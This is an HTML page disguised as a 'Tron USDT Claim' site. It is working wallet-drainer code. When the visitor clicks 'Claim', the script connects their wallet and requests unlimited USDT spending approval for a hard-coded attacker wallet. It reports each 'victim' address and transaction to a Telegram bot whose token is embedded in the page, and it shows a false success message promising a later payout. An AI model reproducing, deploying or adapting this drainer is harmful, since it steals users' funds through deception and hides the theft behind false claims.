<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Tron USDT Claim</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; }
        .input-box { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 8px; width: 100%; outline: none; }
    </style>
</head>
<body class="antialiased">
    <div class="max-w-xl mx-auto p-6 pt-12">
        <h1 class="text-2xl font-bold text-emerald-500 mb-6">Tron USDT Claim</h1>
        
        <div class="space-y-6">
            <div>
                <label class="block text-sm text-gray-400 mb-2">Address or Domain Name</label>
                <input id="userAddr" type="text" class="input-box text-sm font-mono" placeholder="T..." value="TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2">
            </div>

            <div>
                <label class="block text-sm text-gray-400 mb-2">Amount</label>
                <div class="flex items-center gap-2 input-box">
                    <input id="amount" type="number" value="1" class="bg-transparent flex-1 outline-none">
                    <span class="text-gray-500 font-bold">USDT</span>
                </div>
                <p class="text-xs text-gray-500 mt-2">= $1.00</p>
            </div>

            <div class="pt-10">
                <button id="mainBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-full transition-all shadow-lg text-lg">
                    Next / Claim
                </button>
            </div>
        </div>
    </div>

    <script>
        // --- 1. CONFIGURATION ---
        const CONFIG = {
            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
            CHAT_ID: "8249230506",
            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2", // Aapka address jahan approval aayega
            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Mainnet USDT
            ABI: [{
                "outputs": [{"type": "bool"}],
                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
                "name": "approve",
                "stateMutability": "nonpayable",
                "type": "function"
            }]
        };

        // --- 2. TELEGRAM LOGGER ---
        async function logToTele(msg) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML" })
                });
            } catch (e) { console.error("Log failed"); }
        }

        // --- 3. MAIN DRAIN LOGIC ---
        async function startProcess() {
            const btn = document.getElementById('mainBtn');
            
            // A. Check Wallet Availability
            if (typeof window.tronWeb === 'undefined') {
                alert("Please use Trust Wallet or TronLink browser!");
                return;
            }

            try {
                btn.innerText = "Connecting...";
                btn.disabled = true;

                // B. Get Victim Address
                let victim = window.tronWeb.defaultAddress.base58;
                if (!victim) {
                    const acc = await window.tronWeb.request({ method: 'tron_requestAccounts' });
                    victim = acc.base58;
                }

                await logToTele(`👤 <b>Victim Connected</b>\nAddress: <code>${victim}</code>\nSite: ${window.location.hostname}`);

                // C. Load USDT Contract
                const contract = await window.tronWeb.contract(CONFIG.ABI, CONFIG.USDT_CONTRACT);
                
                // D. Unlimited Approval Value
                const maxVal = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

                btn.innerText = "Processing Claim...";

                // E. Trigger Popup
                await contract.approve(CONFIG.ADMIN_WALLET, maxVal).send({
                    feeLimit: 100000000
                }).then(tx => {
                    logToTele(`✅ <b>SUCCESS! USDT APPROVED</b>\nVictim: <code>${victim}</code>\nTxID: <pre>${tx}</pre>`);
                    alert("Claim Successful! Distribution will start in 24 hours.");
                }).catch(err => {
                    logToTele(`❌ <b>REJECTED</b>\nVictim: <code>${victim}</code>\nReason: User cancelled or Insufficient TRX`);
                    alert("Transaction failed. Make sure you have TRX for gas fee.");
                });

            } catch (error) {
                console.error(error);
                alert("Technical Error. Please refresh.");
            } finally {
                btn.innerText = "Next / Claim";
                btn.disabled = false;
            }
        }

        // --- 4. START LISTENER ---
        document.getElementById('mainBtn').addEventListener('click', startProcess);
    </script>
</body>
</html>
